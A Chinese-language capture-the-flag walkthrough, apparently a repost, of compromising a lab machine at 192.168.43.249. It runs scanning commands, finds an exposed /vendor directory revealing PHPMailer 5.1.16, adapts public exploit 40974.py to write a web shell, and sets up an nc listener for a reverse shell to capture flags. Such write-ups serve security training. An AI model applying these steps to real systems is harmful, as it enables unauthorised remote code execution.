> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/tudnrhJRqOn3zRkMSkK-IQ)

0x00 信息收集  

```
nmap -vvv 192.168.43.249/24 
nmap -sC -sV -Pn1-65535 192.168.43.249
dirsearch -u http://192.168.43.249
```

```
其中 http://192.168.43.249/manual/en/index.html 是apache的默认页面
其中 http://192.168.43.249/vendor/ 存在目录文件显示
其中 http://192.168.43.249/wordpress/ 存在wordpress系统（可以使用wpscan）
```

![](https://mmbiz.qpic.cn/mmbiz_png/CwmXBonxXzde6PGZNN7C3icDXtW9fmDqyHjNAnUU1hg6EdOGeeJE8pawiadkNEpXgE1C1cclicOTcC6uib2FgbJbow/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/CwmXBonxXzde6PGZNN7C3icDXtW9fmDqy32nQNytOzq6LFJlvZ1picx1WibEKf80Uh4t0n9ReicFqxSHfIgKia49SXw/640?wx_fmt=png)

```
wpscan --url http://192.168.43.249/wordpress
```

能够扫描到 wordpress 系统版本为: WordPress 4.8.17

apache 版本为 Apache/2.4.10

  
通过 http://192.168.43.249/vendor/PATH 处的目录显示, 能够拿到第一个 flag 和当前文件的绝对路径。

![](https://mmbiz.qpic.cn/mmbiz_png/CwmXBonxXzde6PGZNN7C3icDXtW9fmDqyBaTPRDa9oHQLicXuG8M3KiaLjkic4vaVI3S7naLib6WAO34zTNwRTqH7Ew/640?wx_fmt=png)

```
http://192.168.43.249/vendor/README.md处可以看到web系统为PHPMailer 
http://192.168.43.249/vendor/VERSION处可以看到版本为5.1.16
```

![](https://mmbiz.qpic.cn/mmbiz_png/CwmXBonxXzde6PGZNN7C3icDXtW9fmDqyM3deLaPTwicNia7c6AKfKyjskBhiaFbbWqyu15va4ibpGSib7LMmE90bhIQ/640?wx_fmt=png)

```
searchsploit PHPMailer
```

可以看到很多关于 PHPMailer 的漏洞，其中包含了当前环境可以使用的命令执行漏洞。  

```
locate php/webapps/40974.py  这个脚本是需要进行修改的
```

![](https://mmbiz.qpic.cn/mmbiz_png/CwmXBonxXzde6PGZNN7C3icDXtW9fmDqyaAC1YCktl0F2v8rAuDfflicHtl7N5sD8icSASrSb6SgGia2XiaePWRqz5g/640?wx_fmt=png)

最关键是这里需要修改成从题目环境中取得的绝对路径地址。  
然后运行脚本，再访问即可写入 shell 反弹到 kail 的 nc 上即可拿到 flag2。  

```
Python：

python3 40974.py
nc -lvp 4444
curl http://192.168.43.249/contact.php
curl http://192.168.43.249/shell.php
```

![](https://mmbiz.qpic.cn/mmbiz_png/CwmXBonxXzde6PGZNN7C3icDXtW9fmDqyGwtWBbiaRVke2yG77ppJMpdH3wnDNdL6ZMXzyaYFVqa1SqIZfCZN5gg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/CwmXBonxXzde6PGZNN7C3icDXtW9fmDqy0CIuzoc9keIMSc0EKD3zlpNuJuEhEfzR18rguia6jBAJgCE5ZPW7wibA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/CwmXBonxXzde6PGZNN7C3icDXtW9fmDqygkVTovpvNKkibWg7pYgboZRyvj9AAH3DshRickcyZrNiaxOebrtRPZDYw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/CwmXBonxXzde6PGZNN7C3icDXtW9fmDqyRfIy1LzJfua3o3wkBc1VeVWoKqGGwrTTK0Dp4wHc7BmRUxicDELQXCQ/640?wx_fmt=png)

附件：  

![](https://mmbiz.qpic.cn/mmbiz_png/CwmXBonxXzde6PGZNN7C3icDXtW9fmDqyqB3qnRMVIIwaERbsBopnxUsmSklXnPVSGFel3zOt1iaFibXwIZicUZxLA/640?wx_fmt=png)